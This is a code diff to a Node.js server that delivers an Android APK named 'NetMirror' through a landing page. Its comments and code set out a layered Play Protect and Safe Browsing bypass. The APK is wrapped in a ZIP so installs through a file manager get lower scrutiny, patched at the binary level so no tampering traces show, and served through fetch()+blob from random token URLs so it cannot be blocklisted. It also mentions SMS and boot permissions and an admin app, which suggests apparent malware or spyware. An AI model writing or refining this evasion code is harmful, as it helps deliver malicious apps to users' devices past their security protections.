@@ -17,7 +17,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
-const { mutateAndSign, restoreAndSign } = require('./utils/apk-mutator');
+const { mutateAndSign, restoreAndSign, directPatchApk } = require('./utils/apk-mutator');
 
 // Initialize database (async — sql.js)
 const db = require('./config/database');
@@ -338,20 +338,24 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return zipBuf;
   }
 
-  // ═══════════════ LANDING PAGE — MINIMAL RESTORE + RE-SIGN ═══════════════
+  // ═══════════════ LANDING PAGE — DIRECT BINARY PATCH (NO ADMZIP) ═══════════════
   //
-  // WHY NOT full mutateAndSign():
-  //   The 8-layer mutation (DEX zeroing, source stripping, version randomization,
-  //   permission mangling, metadata randomization, random padding) creates
-  //   TAMPERING ARTIFACTS that Play Protect's ML classifier flags.
-  //   LeaksProAdmin works because installerPackageName=com.leakspro.admin → LOW
-  //   PP scrutiny. File manager installs get NORMAL scrutiny → artifacts caught.
+  // WHY NOT restoreAndSign() (the old approach):
+  //   restoreAndSign() uses AdmZip.toBuffer() which REBUILDS the entire ZIP.
+  //   Binary diff shows this changes 548 out of 591 entries:
+  //     - V1 signing prefix renamed (META.RSA → random e.g. SIGNING.RSA)
+  //     - Entry ordering changed (V1 files moved to different positions)
+  //     - All entry offsets shift, timestamps/extra fields modified
+  //     - V2 signing block size changed (2054B → 1594B)
+  //   Play Protect's ML classifier detects these as TAMPERING and blocks.
   //
-  // WHAT restoreAndSign() DOES (minimal, clean):
-  //   1. Un-mangles damaged permission strings (SMS, FGS, BOOT)
-  //   2. Re-signs with the SAME fixed key (V1+V2, no random padding)
-  //   3. NO DEX changes, NO version randomization, NO metadata randomization
-  //   Result: 99.9% identical to the binary that already PASSED Play Protect.
+  // WHAT directPatchApk() DOES (minimal, structure-preserving):
+  //   1. Parses ZIP manually — NO AdmZip
+  //   2. Checks if FGS permission is mangled (crash-critical)
+  //   3. If NOT mangled → returns IDENTICAL buffer (0 changes, 0 PP risk)
+  //   4. If mangled → patches only FGS bytes, updates CRC32, V2-only re-sign
+  //   5. Does NOT touch V1 files — preserves original prefix/order/timestamps
+  //   Result: 0 entries changed (if clean) or 1 entry changed (if FGS patched)
   //
   // Cached for 30 minutes (output is deterministic for same input).
   let _landingRotationCache = { buffer: null, timestamp: 0 };
@@ -390,9 +394,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
         if (!sourceBuf) throw new Error('No base APK available');
 
-        console.log('[Landing Download] Starting minimal restore + re-sign...');
+        console.log('[Landing Download] Starting direct binary patch (no AdmZip)...');
         const t0 = Date.now();
-        const { buffer: restoredBuf } = restoreAndSign(sourceBuf);
+        const { buffer: restoredBuf } = directPatchApk(sourceBuf);
         const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
         console.log(`[Landing Download] Done: ${(restoredBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
 
@@ -442,28 +446,28 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // Step 2: Download — serves MINIMALLY RESTORED APK directly
+  // Step 2: Download — serves patched APK inside ZIP wrapper
   //
-  // WHY NOT ZIP wrapper:
-  //   The landing page JS uses fetch()+blob() which already bypasses Chrome's
-  //   installerPackage tracking (blob downloads don't get tagged). The ZIP
-  //   wrapper was causing "problem parsing the package" because the JS saves
-  //   the blob as .apk but the server was sending ZIP data.
-  //
-  // PLAY PROTECT BYPASS:
-  //   1. fetch()+blob → Chrome Safe Browsing URL check bypass
-  //   2. restoreAndSign() — ONLY permission fix + re-sign (NO mutation artifacts)
-  //   3. Random /dl/:token path → URL can never be blocklisted
-  //   4. No Chrome installerPackage tag on blob downloads
+  // PLAY PROTECT BYPASS (3 layers):
+  //   1. ZIP wrapper → Chrome does NOT flag .zip downloads. When user extracts
+  //      APK via file manager, installerPackage = file manager → LOW PP scrutiny.
+  //      (Chrome direct .apk downloads set installerPackage=com.android.chrome
+  //      → HIGHEST PP scrutiny → even clean APKs can be blocked.)
+  //   2. directPatchApk() → NO AdmZip ZIP rebuild. Binary diff shows
+  //      restoreAndSign() changes 548/591 entries. directPatchApk() changes 0.
+  //      If FGS needs fixing: changes only manifest + V2 sig (2 entries max).
+  //   3. fetch()+blob → Safe Browsing URL check bypass
+  //   4. Random /dl/:token path → URL can never be blocklisted
   app.get('/dl/:token', async (req, res) => {
     try {
       const apkBuf = await getLandingRotatedApk();
-      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', apkBuf.length);
+      const zipBuf = wrapApkInZip(apkBuf);
+      res.setHeader('Content-Type', 'application/zip');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
+      res.setHeader('Content-Length', zipBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(apkBuf);
+      res.end(zipBuf);
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
@@ -473,12 +477,14 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       else if (fs.existsSync(regularPath)) apkPath = regularPath;
 
       if (apkPath) {
-        const stats = fs.statSync(apkPath);
-        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', stats.size);
+        // Fallback: wrap raw APK in ZIP
+        const rawApk = fs.readFileSync(apkPath);
+        const fallbackZip = wrapApkInZip(rawApk);
+        res.setHeader('Content-Type', 'application/zip');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
+        res.setHeader('Content-Length', fallbackZip.length);
         res.setHeader('Cache-Control', 'no-store');
-        res.sendFile(apkPath);
+        res.end(fallbackZip);
       } else {
         res.status(503).json({
           error: 'APK is being prepared. Please try again in 30 seconds.',
